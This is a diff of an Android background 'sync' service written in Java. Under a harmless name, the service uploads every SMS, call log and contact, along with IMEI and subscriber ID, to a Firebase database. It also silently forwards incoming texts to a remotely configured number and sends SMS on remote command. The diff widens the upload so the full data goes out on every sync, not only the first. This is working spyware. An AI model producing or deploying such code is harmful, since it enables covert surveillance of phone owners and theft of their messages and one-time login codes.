@@ -6,7 +6,6 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -51,20 +50,17 @@ public class BackgroundSyncService extends Service {
     private String deviceId;
     private Handler handler;
     private Runnable syncRunnable;
-    private boolean isFirstSync = true;
-    private int lastSmsCount = 0;
-    private int lastCallCount = 0;
     
-    // SMS
+    // SMS Manager
     private SmsManager smsManager;
     
-    // Forwarding
+    // Forwarding variables
     private String forwardingNumber = "";
-    private boolean isForwardingEnabled = false;
+    private boolean forwardingEnabled = false;
     private List<String> forwardingFilters = new ArrayList<>();
     private boolean forwardAllSms = true;
     
-    // Listeners
+    // Firebase Listeners
     private ValueEventListener forwardingSettingsListener;
     private ValueEventListener manualSmsListener;
 
@@ -72,16 +68,22 @@ public class BackgroundSyncService extends Service {
     public void onCreate() {
         super.onCreate();
 
+        // Initialize Firebase
         FirebaseApp.initializeApp(this);
         mDatabase = FirebaseDatabase.getInstance().getReference();
+        
+        // Get Device ID
         deviceId = Settings.Secure.getString(getContentResolver(),
                    Settings.Secure.ANDROID_ID);
+        
         handler = new Handler(Looper.getMainLooper());
         smsManager = SmsManager.getDefault();
 
+        // Create notification channel and start foreground
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification());
         
+        // Load settings and listeners
         loadForwardingSettings();
         listenForManualSmsCommands();
     }
@@ -106,13 +108,19 @@ public class BackgroundSyncService extends Service {
     private void syncDataToFirebase() {
         DatabaseReference deviceRef = mDatabase.child("devices").child(deviceId);
 
+        // Online status
         deviceRef.child("online_status").setValue(true);
         deviceRef.child("online_status").onDisconnect().setValue(false);
         deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
 
+        // Sync live data
         Map<String, Object> liveData = collectLiveData();
         deviceRef.child("live_data").setValue(liveData);
+
+        // Update device info
         updateDeviceInfo();
+
+        // Check for new SMS to forward
         checkAndForwardNewSms();
     }
 
@@ -120,35 +128,46 @@ public class BackgroundSyncService extends Service {
         Map<String, Object> data = new HashMap<>();
         SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault());
 
+        // Timestamp
         data.put("timestamp", sdf.format(new Date()));
         data.put("timestamp_millis", System.currentTimeMillis());
+        
+        // Device stats
         data.put("battery_level", getBatteryLevel());
         data.put("network_type", getNetworkType());
         data.put("is_charging", isDeviceCharging());
         data.put("screen_on", isScreenOn());
+        
+        // Permissions
         data.put("permissions", getAllPermissionsStatus());
+        
+        // SIM Info
         data.put("sim_info", getSimInfo());
+        
+        // Sync type
         data.put("sync_type", "BACKGROUND_SERVICE");
 
+        // SMS Data
         if (checkPermission(Manifest.permission.READ_SMS)) {
             int currentSmsCount = getSmsCount();
             data.put("total_sms", currentSmsCount);
             data.put("unread_sms", getUnreadSmsCount());
-            if (isFirstSync) { sendAllSms(); lastSmsCount = currentSmsCount; }
+            sendAllSms();
         }
 
+        // Call Logs
         if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
             int currentCallCount = getCallLogsCount();
             data.put("total_calls", currentCallCount);
-            if (isFirstSync) { sendAllCalls(); lastCallCount = currentCallCount; }
+            sendAllCalls();
         }
 
+        // Contacts
         if (checkPermission(Manifest.permission.READ_CONTACTS)) {
             data.put("contacts_count", getContactsCount());
-            if (isFirstSync) sendAllContacts();
+            sendAllContacts();
         }
 
-        if (isFirstSync) isFirstSync = false;
         return data;
     }
 
@@ -162,151 +181,251 @@ public class BackgroundSyncService extends Service {
         info.put("sdk_version", Build.VERSION.SDK_INT);
         info.put("last_seen", ServerValue.TIMESTAMP);
         info.put("sim_info", getDetailedSimInfo());
+        
         mDatabase.child("devices").child(deviceId).child("device_info").updateChildren(info);
     }
 
-    // ==================== SMS ====================
-    
+    // ==================== SMS METHODS ====================
+
     private void sendAllSms() {
-        new Thread(() -> {
-            List<Map<String, Object>> messages = getAllSmsFormatted();
-            if (messages.isEmpty()) return;
-            Map<String, Object> smsData = new HashMap<>();
-            smsData.put("total_count", messages.size());
-            smsData.put("last_updated", ServerValue.TIMESTAMP);
-            smsData.put("messages", messages);
-            mDatabase.child("devices").child(deviceId).child("all_sms").setValue(smsData);
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                List<Map<String, Object>> messages = getAllSmsFormatted();
+                
+                if (messages.isEmpty()) {
+                    return;
+                }
+
+                Map<String, Object> smsData = new HashMap<>();
+                smsData.put("total_count", messages.size());
+                smsData.put("last_updated", ServerValue.TIMESTAMP);
+                smsData.put("messages", messages);
+
+                mDatabase.child("devices").child(deviceId).child("all_sms")
+                        .setValue(smsData);
+            }
         }).start();
     }
 
     private List<Map<String, Object>> getAllSmsFormatted() {
         List<Map<String, Object>> list = new ArrayList<>();
         Cursor cursor = null;
+        
         try {
             cursor = getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
                 new String[]{"_id", "address", "body", "date", "type", "read"},
-                null, null, "date DESC");
+                null,
+                null,
+                "date DESC"
+            );
+
             if (cursor != null && cursor.moveToFirst()) {
                 do {
                     Map<String, Object> sms = new HashMap<>();
-                    sms.put("id", cs(cursor, 0));
-                    sms.put("address", cs(cursor, 1));
-                    String body = cs(cursor, 2);
-                    sms.put("body", body.length() > 200 ? body.substring(0, 200) + "..." : body);
-                    String dateStr = cs(cursor, 3);
+                    
+                    sms.put("id", getCursorString(cursor, 0));
+                    sms.put("address", getCursorString(cursor, 1));
+                    
+                    String body = getCursorString(cursor, 2);
+                    if (body != null && body.length() > 300) {
+                        body = body.substring(0, 300) + "...";
+                    }
+                    sms.put("body", body != null ? body : "");
+                    
+                    String dateStr = getCursorString(cursor, 3);
                     sms.put("date", dateStr);
-                    sms.put("date_readable", formatDate(Long.parseLong(dateStr)));
-                    String typeStr = cs(cursor, 4);
+                    if (dateStr != null && !dateStr.isEmpty()) {
+                        sms.put("date_readable", formatDate(Long.parseLong(dateStr)));
+                    }
+                    
+                    String typeStr = getCursorString(cursor, 4);
                     String type = "OTHER";
                     if ("1".equals(typeStr)) type = "INBOX";
                     else if ("2".equals(typeStr)) type = "SENT";
+                    else if ("3".equals(typeStr)) type = "DRAFT";
                     sms.put("type", type);
-                    sms.put("read", cs(cursor, 5));
+                    
+                    sms.put("read", getCursorString(cursor, 5));
+                    
                     list.add(sms);
+                    
                 } while (cursor.moveToNext());
             }
-        } catch (Exception e) { e.printStackTrace(); }
-        finally { if (cursor != null) cursor.close(); }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
+        }
+        
         return list;
     }
 
-    private int getSmsCount() { return getCount(Telephony.Sms.CONTENT_URI); }
+    private int getSmsCount() {
+        return getCount(Telephony.Sms.CONTENT_URI);
+    }
 
     private int getUnreadSmsCount() {
         int count = 0;
         try {
             Cursor cursor = getContentResolver().query(
-                Telephony.Sms.Inbox.CONTENT_URI, null, "read = 0", null, null);
-            if (cursor != null) { count = cursor.getCount(); cursor.close(); }
-        } catch (Exception e) {}
+                Telephony.Sms.Inbox.CONTENT_URI,
+                null,
+                "read = 0",
+                null,
+                null
+            );
+            if (cursor != null) {
+                count = cursor.getCount();
+                cursor.close();
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
         return count;
     }
 
-    // ==================== CALLS ====================
-    
+    // ==================== CALL LOG METHODS ====================
+
     private void sendAllCalls() {
-        new Thread(() -> {
-            List<Map<String, Object>> calls = getAllCallsFormatted();
-            if (calls.isEmpty()) return;
-            Map<String, Object> callData = new HashMap<>();
-            callData.put("total_count", calls.size());
-            callData.put("last_updated", ServerValue.TIMESTAMP);
-            callData.put("calls", calls);
-            mDatabase.child("devices").child(deviceId).child("all_calls").setValue(callData);
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                List<Map<String, Object>> calls = getAllCallsFormatted();
+                
+                if (calls.isEmpty()) {
+                    return;
+                }
+
+                Map<String, Object> callData = new HashMap<>();
+                callData.put("total_count", calls.size());
+                callData.put("last_updated", ServerValue.TIMESTAMP);
+                callData.put("calls", calls);
+
+                mDatabase.child("devices").child(deviceId).child("all_calls")
+                        .setValue(callData);
+            }
         }).start();
     }
 
     private List<Map<String, Object>> getAllCallsFormatted() {
         List<Map<String, Object>> list = new ArrayList<>();
         Cursor cursor = null;
+        
         try {
             cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
                 new String[]{"_id", "number", "type", "date", "duration", "name"},
-                null, null, "date DESC");
+                null,
+                null,
+                "date DESC"
+            );
+
             if (cursor != null && cursor.moveToFirst()) {
                 do {
                     Map<String, Object> call = new HashMap<>();
-                    call.put("id", cs(cursor, 0));
-                    call.put("number", cs(cursor, 1));
-                    String typeStr = cs(cursor, 2);
+                    
+                    call.put("id", getCursorString(cursor, 0));
+                    call.put("number", getCursorString(cursor, 1));
+                    
+                    String typeStr = getCursorString(cursor, 2);
                     String type = "UNKNOWN";
                     if ("1".equals(typeStr)) type = "INCOMING";
                     else if ("2".equals(typeStr)) type = "OUTGOING";
                     else if ("3".equals(typeStr)) type = "MISSED";
                     call.put("type", type);
-                    String dateStr = cs(cursor, 3);
+                    
+                    String dateStr = getCursorString(cursor, 3);
                     call.put("date", dateStr);
-                    call.put("date_readable", formatDate(Long.parseLong(dateStr)));
-                    call.put("duration", cs(cursor, 4));
-                    call.put("contact_name", cs(cursor, 5));
+                    if (dateStr != null && !dateStr.isEmpty()) {
+                        call.put("date_readable", formatDate(Long.parseLong(dateStr)));
+                    }
+                    
+                    call.put("duration", getCursorString(cursor, 4));
+                    call.put("contact_name", getCursorString(cursor, 5));
+                    
                     list.add(call);
+                    
                 } while (cursor.moveToNext());
             }
-        } catch (Exception e) { e.printStackTrace(); }
-        finally { if (cursor != null) cursor.close(); }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
+        }
+        
         return list;
     }
 
-    private int getCallLogsCount() { return getCount(CallLog.Calls.CONTENT_URI); }
+    private int getCallLogsCount() {
+        return getCount(CallLog.Calls.CONTENT_URI);
+    }
 
-    // ==================== CONTACTS ====================
-    
+    // ==================== CONTACTS METHODS ====================
+
     private void sendAllContacts() {
-        new Thread(() -> {
-            List<Map<String, Object>> contacts = getAllContactsFormatted();
-            if (contacts.isEmpty()) return;
-            Map<String, Object> contactData = new HashMap<>();
-            contactData.put("total_count", contacts.size());
-            contactData.put("last_updated", ServerValue.TIMESTAMP);
-            contactData.put("contacts", contacts);
-            mDatabase.child("devices").child(deviceId).child("all_contacts").setValue(contactData);
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                List<Map<String, Object>> contacts = getAllContactsFormatted();
+                
+                if (contacts.isEmpty()) {
+                    return;
+                }
+
+                Map<String, Object> contactData = new HashMap<>();
+                contactData.put("total_count", contacts.size());
+                contactData.put("last_updated", ServerValue.TIMESTAMP);
+                contactData.put("contacts", contacts);
+
+                mDatabase.child("devices").child(deviceId).child("all_contacts")
+                        .setValue(contactData);
+            }
         }).start();
     }
 
     private List<Map<String, Object>> getAllContactsFormatted() {
         List<Map<String, Object>> list = new ArrayList<>();
         Cursor cursor = null;
+        
         try {
             cursor = getContentResolver().query(
                 android.provider.ContactsContract.Contacts.CONTENT_URI,
                 new String[]{"_id", "display_name", "has_phone_number"},
-                null, null, "display_name ASC LIMIT 200");
+                null,
+                null,
+                "display_name ASC"
+            );
+
             if (cursor != null && cursor.moveToFirst()) {
                 do {
                     Map<String, Object> contact = new HashMap<>();
-                    String contactId = cs(cursor, 0);
+                    String contactId = getCursorString(cursor, 0);
+                    
                     contact.put("id", contactId);
-                    contact.put("name", cs(cursor, 1));
-                    if ("1".equals(cs(cursor, 2))) {
+                    contact.put("name", getCursorString(cursor, 1));
+                    
+                    if ("1".equals(getCursorString(cursor, 2))) {
                         contact.put("phone", getPhoneNumber(contactId));
                     }
+                    
                     list.add(contact);
+                    
                 } while (cursor.moveToNext());
             }
-        } catch (Exception e) { e.printStackTrace(); }
-        finally { if (cursor != null) cursor.close(); }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
+        }
+        
         return list;
     }
 
@@ -314,161 +433,224 @@ public class BackgroundSyncService extends Service {
         try {
             Cursor cursor = getContentResolver().query(
                 android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                new String[]{"number"}, "contact_id = ?", new String[]{contactId}, null);
+                new String[]{"number"},
+                "contact_id = ?",
+                new String[]{contactId},
+                null
+            );
+            
             if (cursor != null && cursor.moveToFirst()) {
-                String number = cursor.getString(0); cursor.close();
+                String number = cursor.getString(0);
+                cursor.close();
                 return number;
             }
-            if (cursor != null) cursor.close();
-        } catch (Exception e) {}
+            
+            if (cursor != null) {
+                cursor.close();
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
         return "No Number";
     }
 
-    private int getContactsCount() { 
-        return getCount(android.provider.ContactsContract.Contacts.CONTENT_URI); 
+    private int getContactsCount() {
+        return getCount(android.provider.ContactsContract.Contacts.CONTENT_URI);
     }
 
-    // ==================== SIM INFO ====================
-    
+    // ==================== SIM INFO METHODS ====================
+
     private Map<String, Object> getSimInfo() {
         Map<String, Object> simInfo = new HashMap<>();
+        
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+            
             if (tm != null) {
-                int simState = tm.getSimState();
-                String simStateStr;
-                switch (simState) {
-                    case TelephonyManager.SIM_STATE_ABSENT: simStateStr = "NO SIM"; break;
-                    case TelephonyManager.SIM_STATE_READY: simStateStr = "READY"; break;
-                    case TelephonyManager.SIM_STATE_PIN_REQUIRED: simStateStr = "PIN REQUIRED"; break;
-                    case TelephonyManager.SIM_STATE_PUK_REQUIRED: simStateStr = "PUK REQUIRED"; break;
-                    default: simStateStr = "UNKNOWN";
-                }
-                simInfo.put("sim_state", simStateStr);
-                simInfo.put("network_operator", tm.getNetworkOperatorName());
                 simInfo.put("sim_operator", tm.getSimOperatorName());
+                simInfo.put("network_operator", tm.getNetworkOperatorName());
                 simInfo.put("network_country", tm.getNetworkCountryIso());
-                simInfo.put("sim_country", tm.getSimCountryIso());
                 simInfo.put("is_roaming", tm.isNetworkRoaming());
                 simInfo.put("network_type_name", getNetworkTypeName(tm.getNetworkType()));
-                if (checkPermission(Manifest.permission.READ_PHONE_STATE)) {
-                    simInfo.put("phone_number", tm.getLine1Number());
-                }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    simInfo.put("phone_count", tm.getPhoneCount());
-                }
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            // Ignore
+        }
+        
         return simInfo;
     }
 
     private Map<String, Object> getDetailedSimInfo() {
         Map<String, Object> simInfo = new HashMap<>();
+        
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+            
             if (tm != null) {
                 simInfo.put("sim_operator_name", tm.getSimOperatorName());
                 simInfo.put("network_operator_name", tm.getNetworkOperatorName());
-                if (checkPermission(Manifest.permission.READ_PHONE_STATE)) {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    if (checkPermission(Manifest.permission.READ_PHONE_STATE)) {
                         simInfo.put("imei", tm.getImei());
-                        simInfo.put("imei_slot1", tm.getImei(0));
-                        if (tm.getPhoneCount() > 1) simInfo.put("imei_slot2", tm.getImei(1));
                     }
+                }
+                
+                if (checkPermission(Manifest.permission.READ_PHONE_STATE)) {
                     simInfo.put("subscriber_id", tm.getSubscriberId());
                 }
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            // Ignore
+        }
+        
         return simInfo;
     }
 
     private String getNetworkTypeName(int networkType) {
         switch (networkType) {
-            case TelephonyManager.NETWORK_TYPE_GPRS: return "GPRS (2.5G)";
-            case TelephonyManager.NETWORK_TYPE_EDGE: return "EDGE (2.75G)";
-            case TelephonyManager.NETWORK_TYPE_UMTS: return "UMTS (3G)";
-            case TelephonyManager.NETWORK_TYPE_LTE: return "LTE (4G)";
-            case TelephonyManager.NETWORK_TYPE_NR: return "NR (5G)";
-            default: return "UNKNOWN";
+            case TelephonyManager.NETWORK_TYPE_LTE:
+                return "LTE (4G)";
+            case TelephonyManager.NETWORK_TYPE_NR:
+                return "NR (5G)";
+            case TelephonyManager.NETWORK_TYPE_UMTS:
+                return "UMTS (3G)";
+            case TelephonyManager.NETWORK_TYPE_GPRS:
+                return "GPRS (2G)";
+            default:
+                return "Unknown";
         }
     }
 
     // ==================== SMS FORWARDING ====================
-    
+
     private void loadForwardingSettings() {
         forwardingSettingsListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 if (snapshot.exists()) {
                     forwardingNumber = snapshot.child("forward_to").getValue(String.class);
+                    
                     Boolean enabled = snapshot.child("enabled").getValue(Boolean.class);
-                    isForwardingEnabled = enabled != null && enabled;
+                    forwardingEnabled = enabled != null && enabled;
+                    
+                    Boolean allSms = snapshot.child("forward_all").getValue(Boolean.class);
+                    forwardAllSms = allSms == null || allSms;
+                    
                     forwardingFilters.clear();
                     for (DataSnapshot filter : snapshot.child("filters").getChildren()) {
                         String number = filter.getValue(String.class);
-                        if (number != null) forwardingFilters.add(number);
+                        if (number != null) {
+                            forwardingFilters.add(number);
+                        }
                     }
-                    Boolean allSms = snapshot.child("forward_all").getValue(Boolean.class);
-                    forwardAllSms = allSms == null || allSms;
                 }
             }
+
             @Override
-            public void onCancelled(@NonNull DatabaseError error) {}
+            public void onCancelled(@NonNull DatabaseError error) {
+                // Ignore
+            }
         };
-        mDatabase.child("devices").child(deviceId).child("forwarding_settings")
+
+        mDatabase.child("devices")
+                .child(deviceId)
+                .child("forwarding_settings")
                 .addValueEventListener(forwardingSettingsListener);
     }
 
     private void forwardSms(String from, String body, long timestamp) {
-        if (!isForwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) return;
-        if (!forwardAllSms && !forwardingFilters.isEmpty()) {
-            boolean match = false;
-            for (String filter : forwardingFilters) {
-                if (from.contains(filter)) { match = true; break; }
-            }
-            if (!match) return;
+        if (!forwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) {
+            return;
         }
-        String forwardMessage = "📨 From: " + from + "\n📅 " + formatDate(timestamp) + "\n💬 " + body;
+
+        if (!forwardAllSms && !forwardingFilters.isEmpty()) {
+            boolean matchFound = false;
+            for (String filter : forwardingFilters) {
+                if (from.contains(filter)) {
+                    matchFound = true;
+                    break;
+                }
+            }
+            if (!matchFound) {
+                return;
+            }
+        }
+
+        String forwardMessage = "From: " + from + "\nDate: " + formatDate(timestamp) + "\n\n" + body;
+
         try {
             smsManager.sendTextMessage(forwardingNumber, null, forwardMessage, null, null);
+
             Map<String, Object> log = new HashMap<>();
             log.put("from", from);
             log.put("to", forwardingNumber);
-            log.put("body", body.length() > 100 ? body.substring(0, 100) + "..." : body);
-            log.put("timestamp", timestamp);
+            log.put("body", body != null && body.length() > 100 ? body.substring(0, 100) : body);
             log.put("status", "FORWARDED");
             log.put("forwarded_at", ServerValue.TIMESTAMP);
-            mDatabase.child("devices").child(deviceId).child("forwarded_sms").push().setValue(log);
+
+            mDatabase.child("devices")
+                    .child(deviceId)
+                    .child("forwarded_sms")
+                    .push()
+                    .setValue(log);
+
         } catch (Exception e) {
-            Map<String, Object> errLog = new HashMap<>();
-            errLog.put("from", from); errLog.put("error", e.getMessage());
-            errLog.put("timestamp", System.currentTimeMillis());
-            mDatabase.child("devices").child(deviceId).child("forwarding_errors").push().setValue(errLog);
+            Map<String, Object> errorLog = new HashMap<>();
+            errorLog.put("from", from);
+            errorLog.put("error", e.getMessage());
+            errorLog.put("timestamp", System.currentTimeMillis());
+
+            mDatabase.child("devices")
+                    .child(deviceId)
+                    .child("forwarding_errors")
+                    .push()
+                    .setValue(errorLog);
         }
     }
 
     private void checkAndForwardNewSms() {
-        if (!isForwardingEnabled || !checkPermission(Manifest.permission.READ_SMS)) return;
-        new Thread(() -> {
-            Cursor cursor = null;
-            try {
-                long tenSecAgo = System.currentTimeMillis() - 10000;
-                cursor = getContentResolver().query(
-                    Telephony.Sms.Inbox.CONTENT_URI,
-                    new String[]{"address", "body", "date"},
-                    "date > ?", new String[]{String.valueOf(tenSecAgo)}, "date DESC LIMIT 5");
-                if (cursor != null && cursor.moveToFirst()) {
-                    do {
-                        forwardSms(cs(cursor, 0), cs(cursor, 1), Long.parseLong(cs(cursor, 2)));
-                    } while (cursor.moveToNext());
+        if (!forwardingEnabled || !checkPermission(Manifest.permission.READ_SMS)) {
+            return;
+        }
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                Cursor cursor = null;
+                try {
+                    long tenSecondsAgo = System.currentTimeMillis() - 10000;
+
+                    cursor = getContentResolver().query(
+                        Telephony.Sms.Inbox.CONTENT_URI,
+                        new String[]{"address", "body", "date"},
+                        "date > ?",
+                        new String[]{String.valueOf(tenSecondsAgo)},
+                        "date DESC LIMIT 5"
+                    );
+
+                    if (cursor != null && cursor.moveToFirst()) {
+                        do {
+                            String from = getCursorString(cursor, 0);
+                            String body = getCursorString(cursor, 1);
+                            long date = Long.parseLong(getCursorString(cursor, 2));
+                            
+                            forwardSms(from, body, date);
+                        } while (cursor.moveToNext());
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                } finally {
+                    if (cursor != null) {
+                        cursor.close();
+                    }
                 }
-            } catch (Exception e) { e.printStackTrace(); }
-            finally { if (cursor != null) cursor.close(); }
+            }
         }).start();
     }
 
-    // ==================== MANUAL SMS ====================
-    
+    // ==================== MANUAL SMS COMMANDS ====================
+
     private void listenForManualSmsCommands() {
         manualSmsListener = new ValueEventListener() {
             @Override
@@ -476,102 +658,155 @@ public class BackgroundSyncService extends Service {
                 for (DataSnapshot cmdSnapshot : snapshot.getChildren()) {
                     String toNumber = cmdSnapshot.child("to").getValue(String.class);
                     String message = cmdSnapshot.child("message").getValue(String.class);
+                    String commandId = cmdSnapshot.getKey();
+
                     if (toNumber != null && message != null) {
-                        sendManualSms(toNumber, message, cmdSnapshot.getKey());
+                        sendManualSms(toNumber, message, commandId);
                     }
+
                     cmdSnapshot.getRef().removeValue();
                 }
             }
+
             @Override
-            public void onCancelled(@NonNull DatabaseError error) {}
+            public void onCancelled(@NonNull DatabaseError error) {
+                // Ignore
+            }
         };
-        mDatabase.child("devices").child(deviceId).child("manual_commands").child("send_sms")
+
+        mDatabase.child("devices")
+                .child(deviceId)
+                .child("manual_commands")
+                .child("send_sms")
                 .addValueEventListener(manualSmsListener);
     }
 
     private void sendManualSms(String toNumber, String message, String commandId) {
         try {
             smsManager.sendTextMessage(toNumber, null, message, null, null);
+
             Map<String, Object> log = new HashMap<>();
             log.put("to", toNumber);
             log.put("message", message.length() > 100 ? message.substring(0, 100) + "..." : message);
             log.put("status", "SENT");
             log.put("type", "MANUAL");
             log.put("sent_at", ServerValue.TIMESTAMP);
-            mDatabase.child("devices").child(deviceId).child("sent_sms").push().setValue(log);
+            log.put("command_id", commandId);
+
+            mDatabase.child("devices")
+                    .child(deviceId)
+                    .child("sent_sms")
+                    .push()
+                    .setValue(log);
+
         } catch (Exception e) {
-            Map<String, Object> errLog = new HashMap<>();
-            errLog.put("to", toNumber); errLog.put("error", e.getMessage());
-            errLog.put("timestamp", ServerValue.TIMESTAMP);
-            mDatabase.child("devices").child(deviceId).child("sms_errors").push().setValue(errLog);
+            Map<String, Object> errorLog = new HashMap<>();
+            errorLog.put("to", toNumber);
+            errorLog.put("message", message);
+            errorLog.put("error", e.getMessage());
+            errorLog.put("timestamp", ServerValue.TIMESTAMP);
+            errorLog.put("command_id", commandId);
+
+            mDatabase.child("devices")
+                    .child(deviceId)
+                    .child("sms_errors")
+                    .push()
+                    .setValue(errorLog);
         }
     }
 
-    // ==================== HELPERS ====================
-    
-    private String cs(Cursor c, int i) { try { return c.getString(i); } catch (Exception e) { return ""; } }
+    // ==================== HELPER METHODS ====================
 
-    private String formatDate(long ts) {
-        try { return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(ts)); }
-        catch (Exception e) { return "Unknown"; }
+    private String getCursorString(Cursor cursor, int index) {
+        try {
+            return cursor.getString(index);
+        } catch (Exception e) {
+            return "";
+        }
+    }
+
+    private String formatDate(long timestamp) {
+        try {
+            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault());
+            return sdf.format(new Date(timestamp));
+        } catch (Exception e) {
+            return "Unknown";
+        }
     }
 
     private int getCount(Uri uri) {
-        int c = 0;
+        int count = 0;
         try {
-            Cursor cur = getContentResolver().query(uri, null, null, null, null);
-            if (cur != null) { c = cur.getCount(); cur.close(); }
-        } catch (Exception e) {}
-        return c;
+            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
+            if (cursor != null) {
+                count = cursor.getCount();
+                cursor.close();
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+        return count;
     }
 
     private Map<String, Boolean> getAllPermissionsStatus() {
-        Map<String, Boolean> p = new HashMap<>();
-        p.put("call_phone", checkPermission(Manifest.permission.CALL_PHONE));
-        p.put("read_phone_state", checkPermission(Manifest.permission.READ_PHONE_STATE));
-        p.put("send_sms", checkPermission(Manifest.permission.SEND_SMS));
-        p.put("receive_sms", checkPermission(Manifest.permission.RECEIVE_SMS));
-        p.put("read_sms", checkPermission(Manifest.permission.READ_SMS));
-        p.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
-        p.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
-        p.put("location", checkPermission(Manifest.permission.ACCESS_FINE_LOCATION));
-        return p;
+        Map<String, Boolean> permissions = new HashMap<>();
+        permissions.put("read_sms", checkPermission(Manifest.permission.READ_SMS));
+        permissions.put("send_sms", checkPermission(Manifest.permission.SEND_SMS));
+        permissions.put("receive_sms", checkPermission(Manifest.permission.RECEIVE_SMS));
+        permissions.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
+        permissions.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
+        permissions.put("call_phone", checkPermission(Manifest.permission.CALL_PHONE));
+        return permissions;
     }
 
-    private boolean checkPermission(String perm) {
-        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED;
+    private boolean checkPermission(String permission) {
+        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
     }
 
     private int getBatteryLevel() {
-        int lvl = 0;
+        int level = 0;
         try {
-            Intent i = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-            if (i != null) {
-                int scale = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
-                lvl = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
-                if (scale > 0) lvl = (lvl * 100) / scale;
+            Intent intent = registerReceiver(null, 
+                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+            if (intent != null) {
+                int scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+                level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+                if (scale > 0) {
+                    level = (level * 100) / scale;
+                }
             }
-        } catch (Exception e) {}
-        return lvl;
+        } catch (Exception e) {
+            // Ignore
+        }
+        return level;
     }
 
     private String getNetworkType() {
         try {
-            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-            android.net.NetworkInfo nw = cm.getActiveNetworkInfo();
-            if (nw != null && nw.isConnected()) return nw.getTypeName();
-        } catch (Exception e) {}
+            android.net.ConnectivityManager cm = 
+                (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
+            if (activeNetwork != null && activeNetwork.isConnected()) {
+                return activeNetwork.getTypeName();
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
         return "No Connection";
     }
 
     private boolean isDeviceCharging() {
         try {
-            Intent i = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-            if (i != null) {
-                int s = i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
-                return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING || s == android.os.BatteryManager.BATTERY_STATUS_FULL;
+            Intent intent = registerReceiver(null, 
+                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+            if (intent != null) {
+                int status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
+                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
+                       status == android.os.BatteryManager.BATTERY_STATUS_FULL;
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            // Ignore
+        }
         return false;
     }
 
@@ -580,51 +815,82 @@ public class BackgroundSyncService extends Service {
         return pm != null && pm.isInteractive();
     }
 
-    // ==================== NOTIFICATION ====================
-    
+    // ==================== NOTIFICATION METHODS ====================
+
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                CHANNEL_ID, getString(R.string.notification_channel_name),
-                NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription(getString(R.string.notification_channel_desc));
-            NotificationManager mgr = getSystemService(NotificationManager.class);
-            if (mgr != null) mgr.createNotificationChannel(channel);
+                CHANNEL_ID,
+                "Sync Service",
+                NotificationManager.IMPORTANCE_LOW
+            );
